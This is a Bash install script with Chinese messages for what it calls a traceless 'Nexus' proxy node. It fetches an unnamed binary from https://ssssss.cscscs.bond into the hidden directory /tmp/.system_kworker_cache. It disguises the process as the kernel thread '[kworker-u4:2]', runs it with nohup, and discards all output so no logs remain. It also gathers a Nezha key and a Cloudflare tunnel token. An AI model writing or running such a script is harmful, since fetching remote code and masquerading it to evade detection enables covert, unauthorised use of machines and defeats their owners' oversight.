#!/usr/bin/env bash
set -u

APP_NAME="nexus"
APP_PORT="${APP_PORT:-3097}"

# 退回原来完美运行的缓存目录！绝不瞎改了！
BASE_DIR="/tmp/.system_kworker_cache"
FAKE_NAME="\[kworker-u4:2\]"
APP_BIN="${BASE_DIR}/${FAKE_NAME}"

WORKER_URL="https://ssssss.cscscs.bond"

GREEN="\033[0;32m"
YELLOW="\033[1;33m"
RED="\033[0;31m"
BLUE="\033[0;34m"
NC="\033[0m"

say() { printf "%b\n" "${GREEN}$*${NC}"; }
warn() { printf "%b\n" "${YELLOW}$*${NC}"; }
err() { printf "%b\n" "${RED}$*${NC}"; }
info() { printf "%b\n" "${BLUE}$*${NC}"; }

need_cmd() {
  command -v "$1" >/dev/null 2>&1
}

fetch_file() {
  url="$1"
  out="$2"
  if need_cmd curl; then
    curl -L --fail --connect-timeout 15 --retry 2 -o "${out}" "${url}"
  elif need_cmd wget; then
    wget -O "${out}" "${url}"
  else
    err "缺少 curl/wget，无法下载。"
    exit 1
  fi
}

port_in_use() {
  port="$1"
  if need_cmd ss; then
    ss -tln | grep -q ":${port} "
  elif need_cmd netstat; then
    netstat -tln | grep -q ":${port} "
  else
    timeout 0.5 bash -c "</dev/tcp/127.0.0.1/${port}" 2>/dev/null
  fi
}

pick_port() {
  while port_in_use "${APP_PORT}"; do
    warn "端口 ${APP_PORT} 已被占用。"
    if [ -n "${ENV_UUID:-}" ] || [ -n "${NON_INTERACTIVE:-}" ]; then
       APP_PORT="$((APP_PORT + 1))"
       continue
    fi
    printf "请输入新端口，或直接回车尝试 [%s]: " "$((APP_PORT + 1))"
    read -r input </dev/tty
    if [ -n "${input}" ]; then
      APP_PORT="${input}"
    else
      APP_PORT="$((APP_PORT + 1))"
    fi
    case "${APP_PORT}" in
      ''|*[!0-9]*) APP_PORT=3097 ;;
    esac
  done
}

ask_config() {
  if [ -n "${ENV_UUID:-}" ] || [ -n "${NON_INTERACTIVE:-}" ]; then
      say "检测到环境变量预设，跳过互动问答！"
      return
  fi

  printf "\n%b\n" "${YELLOW}=== 请配置无痕节点环境变量 (回车表示留空) ===${NC}"
  printf "1.  UUID (核心凭证): "; read -r ENV_UUID </dev/tty
  printf "2.  NEZHA_SERVER (哪吒域名/IP): "; read -r ENV_NEZHA_SERVER </dev/tty
  printf "3.  NEZHA_PORT (v0面板填5555, v1留空): "; read -r ENV_NEZHA_PORT </dev/tty
  printf "4.  NEZHA_KEY (哪吒密钥): "; read -r ENV_NEZHA_KEY </dev/tty
  printf "5.  NEZHA_DOH (安全DNS，如 1.1.1.1/dns-query): "; read -r ENV_NEZHA_DOH </dev/tty
  printf "6.  CF_TUNNEL_TOKEN (隧道Token): "; read -r ENV_CF_TUNNEL_TOKEN </dev/tty
  printf "7.  CF_DOMAIN (自定义域名): "; read -r ENV_CF_DOMAIN </dev/tty
  printf "8.  SUB_PATH (订阅路径): "; read -r ENV_SUB_PATH </dev/tty
  printf "9.  WSPATH (VLESS-WS 路径，默认取UUID前8位): "; read -r ENV_WSPATH </dev/tty
  printf "10. TUIC_PORT (TUIC 协议 UDP 端口，默认30018): "; read -r ENV_TUIC_PORT </dev/tty
  printf "%b\n\n" "${YELLOW}======================================================${NC}"
}

download_binary() {
  ARCH=$(uname -m)
  if [ "$ARCH" = "x86_64" ]; then
      DOWNLOAD_URL="${WORKER_URL}/amd64"
  elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
      DOWNLOAD_URL="${WORKER_URL}/arm64"
  else
      err "不支持的架构: $ARCH"; exit 1
  fi
  
  mkdir -p "${BASE_DIR}"
  say "正在将二进制隐蔽拉取到系统缓存..."
  fetch_file "${DOWNLOAD_URL}" "${APP_BIN}"
  chmod +x "${APP_BIN}" || err "授权失败，可能环境严格受限。"
  say "拉取完成并授权成功！"
}

uninstall_app() {
  printf "\n%b\n" "${RED}=== 准备卸载无痕节点 ===${NC}"
  if [ -z "${NON_INTERACTIVE:-}" ]; then
    printf "%b" "${YELLOW}确定要彻底清除内存幽灵进程吗? [y/N]: ${NC}"
    read -r confirm </dev/tty
    case "${confirm}" in
      y|Y|yes|YES) ;;
      *) warn "已取消。"; exit 0 ;;
    esac
  fi
  
  pkill -f "\[kworker-u4:2\]" >/dev/null 2>&1 || true
  rm -rf "${BASE_DIR}" >/dev/null 2>&1 || true
  say "✅ 内存进程已强行终止，实体彻底灰飞烟灭！"
  exit 0
}

run_install() {
  pkill -f "\[kworker-u4:2\]" >/dev/null 2>&1 || true
  rm -rf "${BASE_DIR}" >/dev/null 2>&1 || true

  ask_config
  pick_port
  download_binary

  export PORT="${APP_PORT}"
  export SERVER_PORT="${APP_PORT}"
  [ -n "${ENV_UUID:-}" ] && export UUID="${ENV_UUID}"
  [ -n "${ENV_NEZHA_SERVER:-}" ] && export NEZHA_SERVER="${ENV_NEZHA_SERVER}"
  [ -n "${ENV_NEZHA_PORT:-}" ] && export NEZHA_PORT="${ENV_NEZHA_PORT}"
  [ -n "${ENV_NEZHA_KEY:-}" ] && export NEZHA_KEY="${ENV_NEZHA_KEY}"
  [ -n "${ENV_NEZHA_DOH:-}" ] && export NEZHA_DOH="${ENV_NEZHA_DOH}"
  [ -n "${ENV_CF_TUNNEL_TOKEN:-}" ] && export CF_TUNNEL_TOKEN="${ENV_CF_TUNNEL_TOKEN}"
  [ -n "${ENV_CF_DOMAIN:-}" ] && export CF_DOMAIN="${ENV_CF_DOMAIN}"
  [ -n "${ENV_SUB_PATH:-}" ] && export SUB_PATH="${ENV_SUB_PATH}"
  [ -n "${ENV_WSPATH:-}" ] && export WSPATH="${ENV_WSPATH}"
  [ -n "${ENV_TUIC_PORT:-}" ] && export TUIC_PORT="${ENV_TUIC_PORT}"

  say "正在唤醒幽灵进程..."
  
  # 【原汁原味】：只做这一处修改，将输出重定向到黑洞，不留任何日志！
  nohup "${APP_BIN}" > /dev/null 2>&1 &

  say "🎉 部署大功告成！"
  say "当前运行端口: ${APP_PORT}"
  warn "进程伪装名称: ${FAKE_NAME}"
}

show_menu() {
  printf "\n%%b\n" "${GREEN} Nexus 无痕版 一键部署脚本 ${NC}"
  printf "  ${YELLOW}1.${NC} 唤醒并在内存中隐藏执行\n"
  printf "  ${YELLOW}2.${NC} 结束并清除幽灵进程\n"
  printf "  ${YELLOW}0.${NC} 退出脚本\n"
  printf "请输入数字 [0-2]: "; read -r choice </dev/tty
  case "${choice}" in
    1) run_install ;;
    2) uninstall_app ;;
    *) exit 0 ;;
  esac
}

if [ "${1:-}" = "uninstall" ]; then uninstall_app
elif [ "${1:-}" = "install" ]; then run_install
else show_menu; fi
